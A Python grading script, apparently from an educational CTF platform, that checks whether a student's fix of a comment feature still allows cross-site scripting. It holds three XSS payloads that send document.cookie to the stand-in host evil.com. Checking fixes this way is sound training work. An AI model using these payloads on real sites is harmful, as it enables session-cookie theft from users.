#!/usr/bin/python3

import random
import requests
import subprocess
import sys

from string import ascii_letters, digits

SELENIUM_HOST = "selenium.pedagogic_ctf"
PORT = 8888


def run_cmd(correction_file, args):

    args.insert(0, correction_file)

    if correction_file.endswith('.py'):
        args.insert(0, 'python3')
    elif correction_file.endswith('.pl'):
        args.insert(0, 'perl')
    elif correction_file.endswith('.go'):
        args.insert(0, 'run')
        args.insert(0, 'go')

    child = subprocess.Popen(args, stdout=subprocess.PIPE)
    streamdata = child.communicate()[0]
    ret = child.returncode
    return streamdata.decode(), ret


def exploit(correction_file, secret):
    """
        Check if the corrected source code is still vulnerable
    """
    evil_comments = (
        """<script>document.write('<img src="http://evil.com:8888/test.gif?cookie=' + document.cookie + '" />')</script>""",
        """<script>img=new Image();img.src="http://evil.com:8888/test.gif?cookie="+document.cookie;</script>""",
        """<IMG SRC=/ onerror="img=new Image();img.src='http://evil.com:8888/aaaatest.gif?cookie='+document.cookie;">"""
    )

    user = ''.join(random.SystemRandom().choice(ascii_letters + digits) for _ in range(32))

    for comment in evil_comments:
        out, return_code = run_cmd(correction_file, [user, comment])
        if return_code != 0:
            print("Invalid execution : {}".format(out))
            return True

        logs = requests.get('http://{}:{}/internal/debug/get-logs?client={}'.format(
            SELENIUM_HOST,
            PORT,
            user
        )).text

        if secret in logs:
            print("I've got the secret ! {}".format(secret))
            return True

    return False


def main():

    correction_file = sys.argv[1]
    secret = sys.argv[2]
    return_code = 1 if exploit(correction_file, secret) else 0
    sys.exit(return_code)


if __name__ == "__main__":
    main()
